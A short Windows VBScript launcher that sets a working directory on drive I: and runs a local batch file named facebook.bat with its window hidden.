Set WshShell = CreateObject("WScript.Shell") 
WshShell.CurrentDirectory="I:\Final\"

WshShell.Run chr(34) & "I:\Final\facebook.bat" & Chr(34), 0
Set WshShell = Nothing 


